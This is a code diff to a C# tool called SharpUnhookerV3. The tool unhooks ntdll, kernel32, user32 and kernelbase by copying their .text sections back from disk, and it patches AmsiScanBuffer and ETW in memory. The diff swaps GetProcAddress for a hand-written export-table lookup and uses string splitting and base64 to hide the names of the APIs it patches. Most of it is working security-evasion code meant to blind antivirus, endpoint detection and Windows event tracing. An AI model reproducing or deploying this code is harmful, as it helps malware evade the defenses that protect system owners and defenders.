@@ -274,8 +274,6 @@ public class PEReader
                 imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
             }
 
-
-
             rawbytes = System.IO.File.ReadAllBytes(filePath);
 
         }
@@ -308,7 +306,6 @@ public class PEReader
             {
                 imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
             }
-
 
             rawbytes = fileBytes;
 
@@ -392,14 +389,61 @@ public class PEReader
 
 public class PatchAMSIAndETW {
     // Import required APIs
-    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, ExactSpelling=true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
     [DllImport("kernel32.dll")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-	static byte[] x64_etw_patch = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
-	static byte[] x86_etw_patch = new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
-	static byte[] x64_amsi_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-	static byte[] x86_amsi_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+    static byte[] x64_etw_patch = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
+    static byte[] x86_etw_patch = new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
+    static byte[] x64_amsi_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    static byte[] x86_amsi_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+
+    // Thx D/Invoke!
+    private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
+        IntPtr FunctionPtr = IntPtr.Zero;
+        try {
+            // Traverse the PE header in memory
+            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+            Int64 pExport = 0;
+            if (Magic == 0x010b) {
+                pExport = OptHeader + 0x60;
+            }
+            else {
+                pExport = OptHeader + 0x70;
+            }
+
+            // Read -> IMAGE_EXPORT_DIRECTORY
+            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+
+            // Loop the array of export name RVA's
+            for (int i = 0; i < NumberOfNames; i++) {
+                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
+                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
+                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
+                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
+                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+                    break;
+                }
+            }
+        }
+        catch {
+            // Catch parser failure
+            throw new InvalidOperationException("Failed to parse module exports.");
+        }
+
+        if (FunctionPtr == IntPtr.Zero) {
+            // Export not found
+            throw new MissingMethodException(ExportName + ", export not found.");
+        }
+        return FunctionPtr;
+    }
 
 	private static string decode(string b64encoded) {
 		return System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64encoded));
@@ -409,7 +453,7 @@ public class PatchAMSIAndETW {
 		try {
 			uint oldProtect;
 			IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
-			IntPtr funcPtr = GetProcAddress(libPtr, function);
+			IntPtr funcPtr = GetExportAddress(libPtr, function);
 			VirtualProtect(funcPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
 			Marshal.Copy(patch, 0, funcPtr, patch.Length);
 		}catch (Exception e) {
@@ -420,7 +464,11 @@ public class PatchAMSIAndETW {
 
 	private static void PatchAMSI(byte[] patch) {
 		string dll = decode("YW1zaS5kbGw=");
-		PatchMem(patch, dll, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
+        foreach (ProcessModule CurrentModule in (Process.GetCurrentProcess().Modules)) {
+            if (CurrentModule.ModuleName == dll) {
+                PatchMem(patch, dll, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
+            }
+        }
 	}
 
 	private static void PatchETW(byte[] Patch) {
@@ -450,10 +498,6 @@ public class PatchAMSIAndETW {
 
 public class SharpUnhooker {
 	// Import required Windows APIs
-	public static uint MEM_COMMIT = 0x1000;
-    public static uint PAGE_EXECUTE_READWRITE = 0x40;
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 	[DllImport("kernel32.dll")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
@@ -464,26 +508,21 @@ public class SharpUnhooker {
     	try {
     		// not only get the full path of the DLL,this can prove wether the DLL is loaded or not
 			DLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
+            Console.WriteLine("{0} is located on {1}", DLLname, DLLFullPath);
     	}catch {
     		throw new InvalidOperationException("DLL is not loaded!");
     	}
     	byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLFullPath);
         PEReader OriginalDLL = new PEReader(DLLBytes);
 		Console.WriteLine("Reading Original DLL...");
-        // just to be safe,i allocate as big as the DLL :')
-        IntPtr codebase;
-		if (OriginalDLL.Is32BitHeader) {
-	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader32.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        }else {
-	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        }
         for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
             if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
             	// read and copy .text section
-                IntPtr byteLocationOnMemory = VirtualAlloc(IntPtr.Add(codebase, (int)OriginalDLL.ImageSectionHeaders[i].VirtualAddress), OriginalDLL.ImageSectionHeaders[i].SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                IntPtr byteLocationOnMemory = Marshal.AllocHGlobal((int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
                 Marshal.Copy(OriginalDLL.RawBytes, (int)OriginalDLL.ImageSectionHeaders[i].PointerToRawData, byteLocationOnMemory, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
                 byte[] assemblyBytes = new byte[OriginalDLL.ImageSectionHeaders[i].SizeOfRawData];
                 Marshal.Copy(byteLocationOnMemory, assemblyBytes, 0, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
+                Marshal.FreeHGlobal(byteLocationOnMemory);
                 int TextSectionNumber = i;
                 if (assemblyBytes != null && assemblyBytes.Length > 0) {
 					Console.WriteLine("Yay!Original DLL Readed.");
@@ -535,25 +574,20 @@ public class SharpUnhooker {
 		try {
     		// not only get the full path of the DLL,this can prove wether the DLL is loaded or not
 			DLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
+            Console.WriteLine("{0} is located on {1}", DLLname, DLLFullPath);
     	}catch {
     		throw new InvalidOperationException("DLL is not loaded!");
     	}
     	byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLFullPath);
         PEReader OriginalDLL = new PEReader(DLLBytes);
-        // just to be safe,i allocate as big as the DLL :')
-        IntPtr codebase;
-		if (OriginalDLL.Is32BitHeader) {
-            codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader32.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        }else {
-            codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        }
         for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
             if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
             	// read and copy .text section
-                IntPtr byteLocationOnMemory = VirtualAlloc(IntPtr.Add(codebase, (int)OriginalDLL.ImageSectionHeaders[i].VirtualAddress), OriginalDLL.ImageSectionHeaders[i].SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                IntPtr byteLocationOnMemory = Marshal.AllocHGlobal((int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
                 Marshal.Copy(OriginalDLL.RawBytes, (int)OriginalDLL.ImageSectionHeaders[i].PointerToRawData, byteLocationOnMemory, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
                 byte[] assemblyBytes = new byte[OriginalDLL.ImageSectionHeaders[i].SizeOfRawData];
                 Marshal.Copy(byteLocationOnMemory, assemblyBytes, 0, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
+                Marshal.FreeHGlobal(byteLocationOnMemory);
                 int TextSectionNumber = i;
                 if (assemblyBytes != null && assemblyBytes.Length > 0) {
 					IntPtr ModuleHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
@@ -587,19 +621,19 @@ public class SharpUnhooker {
     }
 
     public static void Main() {
-		Console.WriteLine("[--------------------------------------]");
-    	Console.WriteLine("SharpUnhookerV3 - C# Based API Unhooker.");
-    	Console.WriteLine("        Written By GetRektBoy724        ");
-    	Console.WriteLine("[--------------------------------------]");
-    	Console.WriteLine("[++++++++++!SEQUENCE=STARTED!++++++++++]");
-    	Console.WriteLine("--------PHASE 1 == API UNHOOKING--------");
-    	// just to be safe,pls dont add more on here
-    	SilentUnhooker("ntdll.dll");
-    	SilentUnhooker("kernel32.dll");
-    	SilentUnhooker("user32.dll");
-    	SilentUnhooker("kernelbase.dll");
-    	Console.WriteLine("----PHASE 2 == PATCHING AMSI AND ETW----");
+		Console.WriteLine("[----------------------------------------]");
+    	Console.WriteLine("SharpUnhookerV3 - C# Based WinAPI Unhooker");
+    	Console.WriteLine("         Written By GetRektBoy724         ");
+    	Console.WriteLine("[----------------------------------------]");
+    	Console.WriteLine("[+++++++++++!SEQUENCE=STARTED!+++++++++++]");
+    	Console.WriteLine("---------PHASE 1 == API UNHOOKING---------");
+        // you can add more in here,if you want
+        SilentUnhooker("ntdll.dll");
+        SilentUnhooker("kernel32.dll");
+        SilentUnhooker("user32.dll");
+        SilentUnhooker("kernelbase.dll");
+    	Console.WriteLine("-----PHASE 2 == PATCHING AMSI AND ETW-----");
     	PatchAMSIAndETW.Main();
-    	Console.WriteLine("[+++++++++!SEQUENCE==FINISHED!+++++++++]");
+    	Console.WriteLine("[++++++++++!SEQUENCE==FINISHED!++++++++++]");
     }
 }
